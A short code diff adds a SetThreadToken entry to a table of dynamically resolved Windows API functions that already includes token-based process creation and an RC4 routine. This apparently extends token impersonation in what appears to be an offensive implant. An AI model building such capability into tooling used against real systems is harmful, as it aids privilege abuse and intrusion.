@@ -293,6 +293,7 @@ typedef struct
         WIN_FUNC( GetUserNameA )
         WIN_FUNC( CreateProcessWithTokenW )
         WIN_FUNC( CreateProcessWithLogonW )
+        WIN_FUNC( SetThreadToken )
         NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );
 
         // Thread Management
